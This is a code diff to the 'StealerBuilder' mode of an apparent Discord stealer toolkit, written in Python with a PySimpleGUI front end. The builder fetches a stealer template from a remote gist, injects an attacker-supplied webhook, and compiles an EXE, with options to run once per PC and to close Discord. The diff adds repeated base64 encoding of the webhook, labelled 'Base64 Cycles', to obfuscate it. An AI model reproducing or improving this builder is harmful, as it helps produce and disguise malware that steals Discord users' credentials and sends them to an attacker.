@@ -1399,14 +1399,15 @@ elif mode == "StealerBuilder":
         else:
             os.chdir('RTBStealerBuilder/')
             pyname = name+'.py'
-            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/715a44f9c115bb207a94ade8d9cd422b112b004f/stealertemplate.py").text
+            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/0bb4d7dc9eddd26568b7afe39069a0f7af40cb8f/stealertemplate.py").text
             with open("template.py", "w+") as handle:
                 handle.write(temp)
             with open("template.py") as f:
                 lines = f.readlines()
             os.remove("template.py")
             with open(pyname, "w") as f:
-                lines.insert(12, "runonce = {}\nkilldisc = {}\nh = '{}'\n".format(str(runonce), str(killdisc), webhook))
+                list_string = [runonce, killdisc, base64.b64encode(str(cycles).encode()).decode(), webhook.decode(), random.randint(1000,9999)]
+                lines.insert(11, f"a = {str(list_string)}")
                 f.write("".join(lines))
             print("Building EXE, Please wait...")
             window.Refresh()
@@ -1430,7 +1431,7 @@ elif mode == "StealerBuilder":
             [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1), key="namea")],
             [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1), key="Webhook"), sg.Button('Test', size=(6,1))],
             [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1), key="iconpath"), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1))],
-            [sg.Text('Run Once Per PC', size=(13, 1)), sg.Combo(['True','False'], default_value="True", key="Run", tooltip="Only Run once per PC to prevent spam.", readonly=True), sg.Text('Close Discord', size=(10, 1)), sg.Combo(['True','False'], default_value="False", key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)", readonly=True), sg.Checkbox('Use Icon', key="Useicon")],
+            [sg.Text('Run Once Per PC', size=(13, 1)), sg.Checkbox('', default=True, key="Run", tooltip="Only Run once per PC to prevent spam."), sg.Text('Close Discord', size=(10, 1)), sg.Checkbox('', default=False, key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)"), sg.Text('Base64 Cycles', size=(10, 1)), sg.Spin([i for i in range(0,50)], initial_value=1, key="Cycles", tooltip="More Cycles = Bigger and slower file"),  sg.Checkbox('Use Icon', key="Useicon")],
             [sg.Output(size=(80, 15))],
             [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
             ]
@@ -1472,11 +1473,14 @@ elif mode == "StealerBuilder":
                 sg.PopupNonBlocking('No webhook entered!')
                 continue
             name = values["namea"]
-            webhook = base64.b64encode(values["Webhook"].encode()).decode()
+            cycles = int(values["Cycles"])
+            webhook = values["Webhook"].encode()
             useicon = values["Useicon"]
             icon = values["iconpath"]
             runonce = values['Run']
             killdisc = values['Close']
+            for x in range(cycles):
+                webhook = base64.b64encode(webhook)
             build()
     window.Close()
 
